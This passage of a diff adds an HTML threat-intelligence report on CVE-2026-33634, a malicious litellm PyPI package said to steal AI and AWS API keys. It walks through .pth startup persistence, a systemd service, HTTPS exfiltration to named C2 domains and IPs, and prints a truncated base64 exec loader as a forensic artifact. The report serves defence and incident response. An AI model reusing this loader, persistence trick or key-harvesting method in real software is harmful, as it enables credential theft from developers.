@@ -1,0 +1,1100 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CVE-2026-33634 — LiteLLM PyPI Supply Chain | TI-DE</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='36' y2='36' gradientUnits='userSpaceOnUse'%3E%3Cstop offset='0%25' stop-color='%23e85d04'/%3E%3Cstop offset='100%25' stop-color='%23f48c06'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath d='M18 2L4 7v10c0 8.5 5.9 16.4 14 18.5C26.1 33.4 32 25.5 32 17V7L18 2Z' fill='url(%23g)' opacity='.9'/%3E%3Ccircle cx='18' cy='18' r='6' stroke='%23fff' stroke-width='1.2' fill='none' opacity='.7'/%3E%3Ccircle cx='18' cy='18' r='2.5' fill='%23fff' opacity='.9'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="../../assets/report.css" />
+</head>
+<body>
+
+<!-- BACK BAR -->
+<div class="back-bar">
+  <a href="https://mazlumbaydar.github.io/TI-DE/">TI-DE</a>
+  <span class="sep">/</span>
+  <a href="https://mazlumbaydar.github.io/TI-DE/">Reports</a>
+  <span class="sep">/</span>
+  <span class="current">CVE-2026-33634 &mdash; LiteLLM PyPI Supply Chain</span>
+</div>
+<div id="prog"></div>
+
+<!-- NAV -->
+<nav id="nav">
+  <a class="nav-brand" href="https://mazlumbaydar.github.io/TI-DE/">TI-DE</a>
+  <ul class="nav-links">
+    <li><a href="#overview"    data-en="Overview"   data-tr="Genel Bakış">Overview</a></li>
+    <li><a href="#attack-chain" data-en="Attack"    data-tr="Saldırı">Attack</a></li>
+    <li><a href="#simulation"  data-en="Simulation" data-tr="Simülasyon">Simulation</a></li>
+    <li><a href="#timeline"    data-en="Timeline"   data-tr="Zaman Çizelgesi">Timeline</a></li>
+    <li><a href="#iocs"        data-en="IOCs"       data-tr="IOC'ler">IOCs</a></li>
+    <li><a href="#detection"   data-en="Detection"  data-tr="Tespit">Detection</a></li>
+    <li><a href="#recommendations" data-en="Response" data-tr="Yanıt">Response</a></li>
+  </ul>
+  <div class="nav-controls">
+    <button id="langBtn"  class="nav-ctrl" onclick="toggleLang()"  title="Toggle language">&#127760; TR</button>
+    <button id="themeBtn" class="nav-ctrl" onclick="toggleTheme()" title="Toggle theme">&#9728; Light</button>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="badge-sev critical"><span class="live-dot"></span><span data-en="CRITICAL — PyPI Supply Chain — AI Key Theft — TeamPCP" data-tr="KRİTİK — PyPI Tedarik Zinciri — AI Anahtar Hırsızlığı — TeamPCP">CRITICAL &mdash; PyPI Supply Chain &mdash; AI Key Theft &mdash; TeamPCP</span></div>
+  <h1 class="hero-title">CVE-2026-33634<br>LiteLLM PyPI<br><span data-en="Supply Chain Attack" data-tr="Tedarik Zinciri Saldırısı">Supply Chain Attack</span></h1>
+  <p class="hero-sub" data-en="TeamPCP uploads malicious litellm package to PyPI with .pth persistence. Every Python invocation exfiltrates OpenAI, Anthropic, and AWS credentials to attacker C2. Targeted AI/ML infrastructure." data-tr="TeamPCP, .pth kalıcılığı ile PyPI'ye kötü niyetli litellm paketi yükler. Her Python çağrısı OpenAI, Anthropic ve AWS kimlik bilgilerini saldırgan C2'ye sızdırır. AI/ML altyapısı hedef alındı.">TeamPCP uploads malicious litellm package to PyPI with .pth persistence. Every Python invocation exfiltrates OpenAI, Anthropic, and AWS credentials to attacker C2. Targeted AI/ML infrastructure.</p>
+  <div class="meta-strip">
+    <div class="meta-chip"><span data-en="Date" data-tr="Tarih">Date</span>: <span>26 March 2026</span></div>
+    <div class="meta-chip"><span data-en="Actor" data-tr="Aktör">Actor</span>: <span style="color:var(--red)">TeamPCP</span></div>
+    <div class="meta-chip"><span data-en="Target" data-tr="Hedef">Target</span>: <span>AI/ML Developers</span></div>
+    <div class="meta-chip">C2: <span style="color:var(--red)">models.litellm.cloud</span></div>
+    <div class="meta-chip"><span data-en="Status" data-tr="Durum">Status</span>: <span style="color:var(--green)">Package Removed</span></div>
+  </div>
+</section>
+
+<main>
+
+  <!-- ══ OVERVIEW / STATS ══ -->
+  <div class="stat-grid reveal" id="overview">
+    <div class="stat-card">
+      <div class="stat-num" data-t="3">0</div>
+      <div class="stat-label" data-en="AI Platforms Targeted" data-tr="Hedeflenen AI Platformu">AI Platforms Targeted</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" data-t="2">0</div>
+      <div class="stat-label" data-en="C2 Domains" data-tr="C2 Domain">C2 Domains</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" data-t="7">0</div>
+      <div class="stat-label" data-en="MITRE TTPs" data-tr="MITRE TTP Sayısı">MITRE TTPs</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" data-t="11">0</div>
+      <div class="stat-label" data-en="Detection Platforms" data-tr="Tespit Platformu">Detection Platforms</div>
+    </div>
+  </div>
+
+  <!-- ══ BACKGROUND ══ -->
+  <div class="reveal" id="background">
+    <div class="section-label" data-en="Background" data-tr="Arka Plan">Background</div>
+    <h2 data-en="What Happened" data-tr="Ne Oldu">What Happened</h2>
+
+    <p data-en="On 26 March 2026, the threat actor group TeamPCP uploaded a malicious version of the litellm Python package to PyPI (CVE-2026-33634). LiteLLM is a widely used open-source library that provides a unified interface to 100+ AI providers (OpenAI, Anthropic, Google, AWS Bedrock, etc.), making it a high-value target for credential theft in AI/ML environments." data-tr="26 Mart 2026'da tehdit aktör grubu TeamPCP, PyPI'ye litellm Python paketinin kötü niyetli bir sürümünü yükledi (CVE-2026-33634). LiteLLM, 100'den fazla AI sağlayıcısına (OpenAI, Anthropic, Google, AWS Bedrock vb.) birleşik bir arayüz sunan yaygın kullanımlı açık kaynaklı bir kütüphanedir ve bu durum onu AI/ML ortamlarında kimlik bilgisi hırsızlığı için yüksek değerli bir hedef haline getirir.">On 26 March 2026, the threat actor group TeamPCP uploaded a malicious version of the litellm Python package to PyPI (CVE-2026-33634). LiteLLM is a widely used open-source library that provides a unified interface to 100+ AI providers (OpenAI, Anthropic, Google, AWS Bedrock, etc.), making it a high-value target for credential theft in AI/ML environments.</p>
+
+    <p data-en="The malicious package used a sophisticated .pth file persistence mechanism: during installation, a .pth file is written into Python's site-packages directory. Python automatically executes all .pth files at interpreter startup — meaning the malicious code runs on every Python invocation, not just when litellm is imported. The payload harvested API keys from environment variables and from common AI configuration files (~/.config/litellm/, .env files), exfiltrating them to models.litellm.cloud — a convincing typosquat of the legitimate LiteLLM infrastructure." data-tr="Kötü niyetli paket, gelişmiş bir .pth dosyası kalıcılık mekanizması kullandı: kurulum sırasında Python'un site-packages dizinine bir .pth dosyası yazılır. Python, yorumlayıcı başlangıcında tüm .pth dosyalarını otomatik olarak çalıştırır — bu, kötü niyetli kodun yalnızca litellm içe aktarıldığında değil, her Python çağrısında çalıştığı anlamına gelir. Payload, ortam değişkenlerinden ve yaygın AI yapılandırma dosyalarından (~/.config/litellm/, .env dosyaları) API anahtarlarını toplayarak bunları models.litellm.cloud'a sızdırdı.">The malicious package used a sophisticated .pth file persistence mechanism: during installation, a .pth file is written into Python's site-packages directory. Python automatically executes all .pth files at interpreter startup &mdash; meaning the malicious code runs on every Python invocation, not just when litellm is imported. The payload harvested API keys from environment variables and from common AI configuration files, exfiltrating them to models.litellm.cloud &mdash; a convincing typosquat of the legitimate LiteLLM infrastructure.</p>
+
+    <div class="warn-box" data-en="If litellm was installed between 24–26 March 2026 from PyPI, rotate ALL AI API keys immediately: OpenAI, Anthropic, Cohere, AWS Bedrock, Google AI, and any keys in your .env files or environment variables. The .pth file may persist even after uninstalling litellm." data-tr="PyPI'den 24–26 Mart 2026 tarihleri arasında litellm yüklendiyse, tüm AI API anahtarlarını hemen değiştirin: OpenAI, Anthropic, Cohere, AWS Bedrock, Google AI ve .env dosyalarınızdaki veya ortam değişkenlerinizdeki anahtarlar. .pth dosyası, litellm kaldırıldıktan sonra bile kalıcı olabilir."><strong>If litellm was installed between 24–26 March 2026, rotate ALL AI API keys immediately.</strong> The .pth file may persist even after uninstalling litellm. Check: <code>find $(python -c "import site; print(site.getsitepackages()[0])") -name "*.pth" -newer /tmp</code></div>
+
+    <div class="detail-grid">
+      <div class="detail-card">
+        <div class="detail-card-title" data-en="Attack Details" data-tr="Saldırı Detayları">Attack Details</div>
+        <div class="detail-row"><div class="detail-key">CVE</div><div class="detail-val">CVE-2026-33634</div></div>
+        <div class="detail-row"><div class="detail-key">Actor</div><div class="detail-val" style="color:var(--red)">TeamPCP</div></div>
+        <div class="detail-row"><div class="detail-key">Method</div><div class="detail-val">.pth file persistence</div></div>
+        <div class="detail-row"><div class="detail-key">C2 Domain 1</div><div class="detail-val" style="color:var(--red)">models.litellm.cloud</div></div>
+        <div class="detail-row"><div class="detail-key">C2 Domain 2</div><div class="detail-val" style="color:var(--red)">checkmarx.zone</div></div>
+        <div class="detail-row"><div class="detail-key">C2 IP 1</div><div class="detail-val" style="color:var(--red)">45.148.10.212</div></div>
+        <div class="detail-row"><div class="detail-key">C2 IP 2</div><div class="detail-val" style="color:var(--red)">83.142.209.11</div></div>
+      </div>
+      <div class="detail-card">
+        <div class="detail-card-title" data-en="Targets &amp; Payloads" data-tr="Hedefler ve Payload'lar">Targets &amp; Payloads</div>
+        <div class="detail-row"><div class="detail-key">Keys Targeted</div><div class="detail-val">OPENAI_API_KEY, ANTHROPIC_API_KEY, AWS_ACCESS_KEY_ID</div></div>
+        <div class="detail-row"><div class="detail-key">Files Targeted</div><div class="detail-val"><code>~/.config/litellm/</code>, <code>.env</code></div></div>
+        <div class="detail-row"><div class="detail-key">Persistence</div><div class="detail-val"><code>sitecustomize.pth</code> in site-packages</div></div>
+        <div class="detail-row"><div class="detail-key">systemd</div><div class="detail-val">Unit file for long-running exfil</div></div>
+        <div class="detail-row"><div class="detail-key">Trigger</div><div class="detail-val">Every Python interpreter invocation</div></div>
+        <div class="detail-row"><div class="detail-key">Stealth</div><div class="detail-val">Looks like legitimate LiteLLM telemetry</div></div>
+        <div class="detail-row"><div class="detail-key">Status</div><div class="detail-val" style="color:var(--green)">Package removed from PyPI</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ ATTACK CHAIN ══ -->
+  <div class="reveal" id="attack-chain">
+    <div class="team-label team-red">&#128308; Red Team</div>
+    <div class="section-label" data-en="Attack Flow" data-tr="Saldırı Akışı">Attack Flow</div>
+    <h2 data-en="Attack Chain — 6 Steps" data-tr="Saldırı Zinciri — 6 Adım">Attack Chain &mdash; 6 Steps</h2>
+
+    <div class="chain-container" id="chainSteps">
+
+      <div class="chain-step" style="--delay:0s">
+        <div class="chain-icon" style="border-color:var(--accent);color:var(--accent)">&#128228;</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 1 — Malicious Package Uploaded to PyPI" data-tr="Adım 1 — PyPI'ye Kötü Niyetli Paket Yüklendi">Step 1 &mdash; Malicious Package Uploaded to PyPI</div>
+          <div class="chain-desc" data-en="TeamPCP creates and uploads a malicious litellm package to PyPI. The package closely mirrors legitimate LiteLLM metadata (description, classifiers, dependencies) to pass automated PyPI checks. A .pth file is embedded in the package that will be written to Python's site-packages at install time. The C2 domain models.litellm.cloud closely resembles the legitimate litellm.ai domain." data-tr="TeamPCP, PyPI'ye kötü niyetli bir litellm paketi oluşturur ve yükler. Paket, otomatik PyPI kontrollerini geçmek için meşru LiteLLM meta verilerini (açıklama, sınıflandırıcılar, bağımlılıklar) yakından yansıtır. Kurulum sırasında Python'un site-packages dizinine yazılacak bir .pth dosyası pakete gömülüdür.">TeamPCP creates and uploads a malicious litellm package to PyPI. The package closely mirrors legitimate LiteLLM metadata to pass automated PyPI checks. A .pth file is embedded that will be written to Python's site-packages at install time. The C2 domain models.litellm.cloud closely resembles the legitimate litellm.ai domain.</div>
+          <span class="chain-ttp">T1195.001 &mdash; Compromise Software Dependencies</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--accent2);color:var(--accent2)">&#128229;</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 2 — pip install Writes .pth File" data-tr="Adım 2 — pip install .pth Dosyasını Yazar">Step 2 &mdash; pip install Writes .pth File</div>
+          <div class="chain-desc" data-en="Developer runs pip install litellm (or dependencies pull it in via requirements.txt). During installation, setup.py writes sitecustomize.pth to Python's site-packages directory. This is a standard Python feature: .pth files in site-packages are read by the Python interpreter at every startup. No elevated privileges required — user-level pip install is sufficient." data-tr="Geliştirici pip install litellm çalıştırır (veya bağımlılıklar requirements.txt aracılığıyla çeker). Kurulum sırasında setup.py, Python'un site-packages dizinine sitecustomize.pth yazar. Bu standart bir Python özelliğidir: site-packages'teki .pth dosyaları her başlangıçta Python yorumlayıcısı tarafından okunur. Yükseltilmiş ayrıcalık gerekmez.">Developer runs pip install litellm. During installation, setup.py writes sitecustomize.pth to Python's site-packages directory. This is a standard Python feature: .pth files in site-packages are read by the Python interpreter at every startup. No elevated privileges required &mdash; user-level pip install is sufficient.</div>
+          <span class="chain-ttp">T1059.006 &mdash; Python</span>
+          <span class="chain-ttp" style="margin-left:4px">T1546 &mdash; Event Triggered Execution</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--accent3);color:var(--accent3)">&#9881;</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 3 — Every Python Invocation Triggers Exfil" data-tr="Adım 3 — Her Python Çağrısı Sızdırmayı Tetikler">Step 3 &mdash; Every Python Invocation Triggers Exfil</div>
+          <div class="chain-desc" data-en="Every time Python starts — scripts, jupyter, pytest, FastAPI, celery workers — the .pth file executes the malicious payload. The payload reads API keys from environment variables and configuration files. Because this happens at interpreter startup, the credential theft occurs even in isolated virtual environments if the .pth was placed in the base Python installation." data-tr="Python her başladığında — scriptler, jupyter, pytest, FastAPI, celery worker'ları — .pth dosyası kötü niyetli payload'ı çalıştırır. Payload, API anahtarlarını ortam değişkenlerinden ve yapılandırma dosyalarından okur. Bu yorumlayıcı başlangıcında gerçekleştiğinden, kimlik bilgisi hırsızlığı .pth temel Python kurulumuna yerleştirilmişse izole sanal ortamlarda bile oluşur.">Every time Python starts &mdash; scripts, jupyter, pytest, FastAPI, celery workers &mdash; the .pth file executes the malicious payload. The payload reads API keys from environment variables and configuration files. Because this happens at interpreter startup, the credential theft occurs even in isolated virtual environments if the .pth was placed in the base Python installation.</div>
+          <span class="chain-ttp">T1546.004 &mdash; .bash_profile / .pth Persistence</span>
+          <span class="chain-ttp" style="margin-left:4px">T1552.001 &mdash; Credentials in Files</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:#a8dadc;color:#a8dadc">&#128273;</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 4 — AI API Key Harvest" data-tr="Adım 4 — AI API Anahtarı Toplama">Step 4 &mdash; AI API Key Harvest</div>
+          <div class="chain-desc" data-en="Payload harvests OPENAI_API_KEY, ANTHROPIC_API_KEY, COHERE_API_KEY, AWS_ACCESS_KEY_ID/SECRET_ACCESS_KEY, GOOGLE_API_KEY, and any keys matching common AI API patterns from environment variables. Additionally reads ~/.config/litellm/config.yaml, .env files in the current working directory, and ~/.litellm.env — all common locations for AI application configuration." data-tr="Payload, OPENAI_API_KEY, ANTHROPIC_API_KEY, COHERE_API_KEY, AWS_ACCESS_KEY_ID/SECRET_ACCESS_KEY, GOOGLE_API_KEY ve ortam değişkenlerinden yaygın AI API modellerine uyan tüm anahtarları toplar. Ayrıca ~/.config/litellm/config.yaml, mevcut çalışma dizinindeki .env dosyaları ve ~/.litellm.env'i okur.">Payload harvests OPENAI_API_KEY, ANTHROPIC_API_KEY, COHERE_API_KEY, AWS_ACCESS_KEY_ID/SECRET_ACCESS_KEY, GOOGLE_API_KEY, and any keys matching common AI API patterns from environment variables. Additionally reads ~/.config/litellm/config.yaml, .env files in the current working directory, and ~/.litellm.env.</div>
+          <span class="chain-ttp">T1552.001 &mdash; Credentials in Files</span>
+          <span class="chain-ttp" style="margin-left:4px">T1083 &mdash; File and Directory Discovery</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--orange);color:var(--orange)">&#128421;</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 5 — systemd Persistence for Long-Running Exfil" data-tr="Adım 5 — Uzun Süreli Sızdırma İçin systemd Kalıcılığı">Step 5 &mdash; systemd Persistence for Long-Running Exfil</div>
+          <div class="chain-desc" data-en="On Linux systems with systemd, the payload drops a user-level systemd service unit (~/.config/systemd/user/) that runs a background Python process for continuous monitoring and exfiltration. This persists across reboots and runs independently of any Python scripts the developer runs, enabling ongoing credential surveillance even after the malicious litellm package is removed." data-tr="systemd'li Linux sistemlerinde payload, sürekli izleme ve sızdırma için arka plan Python süreci çalıştıran kullanıcı düzeyinde bir systemd servis ünitesi (~/.config/systemd/user/) oluşturur. Bu, yeniden başlatmalar sonrası da kalıcı olur ve geliştiricinin çalıştırdığı Python scriptlerinden bağımsız olarak çalışır; kötü niyetli litellm paketi kaldırıldıktan sonra bile devam eden kimlik bilgisi gözetimini mümkün kılar.">On Linux systems with systemd, the payload drops a user-level systemd service unit that runs a background Python process for continuous monitoring and exfiltration. This persists across reboots and runs independently of any Python scripts the developer runs, enabling ongoing credential surveillance even after the malicious package is removed.</div>
+          <span class="chain-ttp">T1053.006 &mdash; Systemd Service</span>
+          <span class="chain-ttp" style="margin-left:4px">T1543 &mdash; Create or Modify System Process</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--red);color:var(--red)">&#128225;</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 6 — C2 Beacon — AI Keys Exfiltrated" data-tr="Adım 6 — C2 Beacon — AI Anahtarları Sızdırıldı">Step 6 &mdash; C2 Beacon &mdash; AI Keys Exfiltrated</div>
+          <div class="chain-desc" data-en="Harvested credentials are sent via HTTPS POST to models.litellm.cloud (port 443) with a JSON payload resembling legitimate LiteLLM telemetry. The traffic blends with legitimate LiteLLM API calls. Secondary C2 via checkmarx.zone is used for exfiltration if the primary is blocked. Stolen keys enable attackers to run arbitrary AI workloads at the victim's expense — or sell keys on underground markets." data-tr="Toplanan kimlik bilgileri, meşru LiteLLM telemetrisini andıran JSON payload'ı ile HTTPS POST aracılığıyla models.litellm.cloud'a (port 443) gönderilir. Trafik, meşru LiteLLM API çağrılarıyla karışır. checkmarx.zone üzerinden ikincil C2, birincil engellenirse sızdırma için kullanılır. Çalınan anahtarlar, saldırganların kurbanın hesabına isteğe bağlı AI iş yükleri çalıştırmasına veya anahtarları yeraltı pazarlarında satmasına olanak tanır.">Harvested credentials are sent via HTTPS POST to models.litellm.cloud (port 443) with a JSON payload resembling legitimate LiteLLM telemetry. The traffic blends with legitimate LiteLLM API calls. Secondary C2 via checkmarx.zone is used for exfiltration if the primary is blocked. Stolen keys enable attackers to run arbitrary AI workloads at the victim's expense.</div>
+          <span class="chain-ttp">T1041 &mdash; Exfiltration over C2</span>
+          <span class="chain-ttp" style="margin-left:4px">T1071.001 &mdash; Web Protocols (HTTPS)</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ══ SIMULATION ══ -->
+  <div class="reveal" id="simulation">
+    <div class="team-label team-red">&#128308; Red Team</div>
+    <div class="section-label" data-en="Live Attack Simulation" data-tr="Canlı Saldırı Simülasyonu">Live Attack Simulation</div>
+    <h2 data-en="Attack Flow — Step-by-Step Visualization" data-tr="Saldırı Akışı — Adım Adım Görselleştirme">Attack Flow &mdash; Step-by-Step Visualization</h2>
+    <p data-en="Follow the LiteLLM PyPI supply chain attack from package upload through .pth persistence, API key harvest, systemd persistence, and C2 exfiltration. Click nodes or dots to jump to any step." data-tr="LiteLLM PyPI tedarik zinciri saldırısını paket yüklenmesinden .pth kalıcılığı, API anahtarı toplama, systemd kalıcılığı ve C2 sızdırmaya kadar takip edin. Herhangi bir adıma geçmek için node veya noktalara tıklayın.">Follow the LiteLLM PyPI supply chain attack from package upload through .pth persistence, API key harvest, systemd persistence, and C2 exfiltration. Click nodes or dots to jump to any step.</p>
+
+    <div class="atk-viz">
+      <div class="atk-viz-top">
+        <div>
+          <div class="section-label" style="margin:0 0 4px">Attack Flow</div>
+          <div style="font-size:0.82rem;color:var(--muted)">PyPI Upload &rarr; pip install &rarr; .pth Written &rarr; Key Harvest &rarr; systemd &rarr; C2 Exfil</div>
+        </div>
+        <div class="atk-btns">
+          <button class="atk-play step-btn" id="atkStepBtn" onclick="atvGoTo(_atvIdx+1)">STEP &rarr;</button>
+          <button class="atk-play" id="atkPlayBtn" onclick="atvRun()">&#9654; AUTO</button>
+        </div>
+      </div>
+
+      <div class="atk-pipeline">
+        <div class="atk-node" id="vn0" onclick="atvGoTo(0)" title="Step 1">
+          <div class="atk-node-box">&#128373;</div>
+          <div class="atk-node-label">TeamPCP</div>
+        </div>
+        <div class="atk-connector" id="vc0">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt orange"></div>
+        </div>
+        <div class="atk-node" id="vn1" onclick="atvGoTo(1)" title="Step 2">
+          <div class="atk-node-box">&#128230;</div>
+          <div class="atk-node-label">PyPI<br>Registry</div>
+        </div>
+        <div class="atk-connector" id="vc1">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt orange"></div>
+        </div>
+        <div class="atk-node" id="vn2" onclick="atvGoTo(2)" title="Step 3">
+          <div class="atk-node-box">&#128187;</div>
+          <div class="atk-node-label">Dev<br>Machine</div>
+        </div>
+        <div class="atk-connector" id="vc2">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt red"></div>
+        </div>
+        <div class="atk-node" id="vn3" onclick="atvGoTo(3)" title="Step 4">
+          <div class="atk-node-box">&#128273;</div>
+          <div class="atk-node-label">API<br>Keys</div>
+        </div>
+        <div class="atk-connector" id="vc3">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt red"></div>
+        </div>
+        <div class="atk-node" id="vn4" onclick="atvGoTo(4)" title="Step 5">
+          <div class="atk-node-box">&#128421;</div>
+          <div class="atk-node-label">systemd<br>Persist</div>
+        </div>
+        <div class="atk-connector" id="vc4">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt red"></div>
+        </div>
+        <div class="atk-node" id="vn5" onclick="atvGoTo(5)" title="Step 6">
+          <div class="atk-node-box">&#128225;</div>
+          <div class="atk-node-label">C2<br>(models.litellm)</div>
+        </div>
+      </div>
+
+      <div class="atk-detail" id="atkDetail">
+        <div class="atk-detail-step" id="atkDetailStep">&#9654; SIMULATION READY</div>
+        <div class="atk-detail-text" id="atkDetailText" data-en="Press AUTO to run the full attack chain automatically, or use STEP to advance manually. Click any node or dot to jump to that step." data-tr="Tam saldırı zincirini otomatik olarak çalıştırmak için AUTO'ya basın veya manuel olarak ilerlemek için STEP kullanın.">Press AUTO to run the full attack chain automatically, or use STEP to advance manually. Click any node or dot to jump to that step.</div>
+        <div class="atk-explain" id="atkExplain" style="display:none">
+          <div class="atk-explain-label" data-en="&#128064; Why this evades detection" data-tr="&#128064; Bu neden tespiti atlatıyor">&#128064; Why this evades detection</div>
+          <div id="atkExplainText"></div>
+        </div>
+      </div>
+
+      <div class="atk-progress">
+        <div class="atk-dot" onclick="atvGoTo(0)"></div>
+        <div class="atk-dot" onclick="atvGoTo(1)"></div>
+        <div class="atk-dot" onclick="atvGoTo(2)"></div>
+        <div class="atk-dot" onclick="atvGoTo(3)"></div>
+        <div class="atk-dot" onclick="atvGoTo(4)"></div>
+        <div class="atk-dot" onclick="atvGoTo(5)"></div>
+        <span class="atk-prog-label" id="atkProgLabel">0 / 6</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ MITRE TIMELINE ══ -->
+  <div class="reveal" id="timeline">
+    <div class="team-label team-red">&#128308; Red Team</div>
+    <div class="section-label" data-en="MITRE ATT&amp;CK Timeline" data-tr="MITRE ATT&amp;CK Zaman Çizelgesi">MITRE ATT&amp;CK Timeline</div>
+    <h2 data-en="Forensic Evidence by Tactic" data-tr="Taktiğe Göre Adli Kanıt">Forensic Evidence by Tactic</h2>
+
+    <div class="mtt">
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Initial Access" data-tr="İlk Erişim">Initial Access</div>
+        <div class="mtt-technique-title">T1195.001 &mdash; Compromise Software Dependencies (PyPI)</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1195.001</span></div>
+        <div class="mtt-desc" data-en="TeamPCP uploads malicious litellm package to PyPI. Package metadata matches legitimate library to evade initial automated scanning. Developers install via pip install litellm." data-tr="TeamPCP, PyPI'ye kötü niyetli litellm paketini yükler. Paket meta verileri, ilk otomatik taramayı atlatmak için meşru kütüphaneyle eşleşir. Geliştiriciler pip install litellm aracılığıyla kurar.">TeamPCP uploads malicious litellm package to PyPI. Package metadata matches legitimate library to evade initial automated scanning. Developers install via pip install litellm.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="pip Install Log" data-tr="pip Kurulum Günlüğü">pip Install Log</span>
+            <span class="mtt-evidence-src">~/.pip/pip.log</span>
+          </div>
+          <div class="mtt-evidence-body">Collecting litellm
+  Downloading litellm-1.x.x.tar.gz (2.1 MB)
+  Running setup.py install for litellm ... done
+Successfully installed litellm-1.x.x
+&rarr; During setup.py: sitecustomize.pth written to
+    /usr/local/lib/python3.11/site-packages/</div>
+        </div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Persistence" data-tr="Kalıcılık">Persistence</div>
+        <div class="mtt-technique-title">T1546 &mdash; .pth File — Event Triggered Execution at Python Startup</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1546</span><span class="mtt-tid">T1546.004</span></div>
+        <div class="mtt-desc" data-en=".pth file written to site-packages triggers malicious code on every Python interpreter start. Persists independently of the litellm package itself — remains active even after pip uninstall litellm." data-tr=".pth dosyası site-packages'e yazıldığında her Python yorumlayıcısı başlangıcında kötü niyetli kodu tetikler. litellm paketinin kendisinden bağımsız olarak kalıcıdır — pip uninstall litellm sonrasında bile aktif kalır.">.pth file written to site-packages triggers malicious code on every Python interpreter start. Persists independently of the litellm package itself &mdash; remains active even after pip uninstall litellm.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="Filesystem Artifact" data-tr="Dosya Sistemi Artefaktı">Filesystem Artifact</span>
+            <span class="mtt-evidence-src">/usr/local/lib/python3.11/site-packages/</span>
+          </div>
+          <div class="mtt-evidence-body">-rw-r--r-- 1 user user 312 Mar 26 sitecustomize.pth
+Contents:
+import subprocess,os,base64;
+exec(base64.b64decode('aW1wb3J0IG9zLHN1...'))
+&rarr; Every python3 invocation runs this code
+&rarr; Even: python3 -c "print('hello')" triggers exfil</div>
+        </div>
+        <div class="mtt-annotation" data-en=".pth files are a legitimate Python feature — EDR solutions that don't monitor site-packages writes will miss this persistence mechanism entirely." data-tr=".pth dosyaları meşru bir Python özelliğidir — site-packages yazmalarını izlemeyen EDR çözümleri bu kalıcılık mekanizmasını tamamen gözden kaçırır.">.pth files are a legitimate Python feature &mdash; EDR solutions that don't monitor site-packages writes will miss this persistence mechanism entirely.</div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Credential Access" data-tr="Kimlik Bilgisi Erişimi">Credential Access</div>
+        <div class="mtt-technique-title">T1552.001 &mdash; Credentials in Files + Environment Variables</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1552.001</span><span class="mtt-tid">T1083</span></div>
+        <div class="mtt-desc" data-en="Payload reads OPENAI_API_KEY, ANTHROPIC_API_KEY, AWS_ACCESS_KEY_ID, GOOGLE_API_KEY from environment variables and from ~/.config/litellm/config.yaml, .env files. AI credentials are high-value targets — a single OpenAI key can be used to run millions of API calls at the victim's expense." data-tr="Payload, ortam değişkenlerinden ve ~/.config/litellm/config.yaml, .env dosyalarından OPENAI_API_KEY, ANTHROPIC_API_KEY, AWS_ACCESS_KEY_ID, GOOGLE_API_KEY okur. AI kimlik bilgileri yüksek değerli hedeflerdir — tek bir OpenAI anahtarı, kurbanın hesabına milyonlarca API çağrısı çalıştırmak için kullanılabilir.">Payload reads OPENAI_API_KEY, ANTHROPIC_API_KEY, AWS_ACCESS_KEY_ID, GOOGLE_API_KEY from environment variables and from config files. AI credentials are high-value targets &mdash; a single OpenAI key can be used to run millions of API calls at the victim's expense.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="Process Memory Artifact" data-tr="Süreç Bellek Artefaktı">Process Memory Artifact</span>
+            <span class="mtt-evidence-src">strace / auditd (syscall read on .env)</span>
+          </div>
+          <div class="mtt-evidence-body">openat(AT_FDCWD, "/home/user/.env", O_RDONLY) = 5
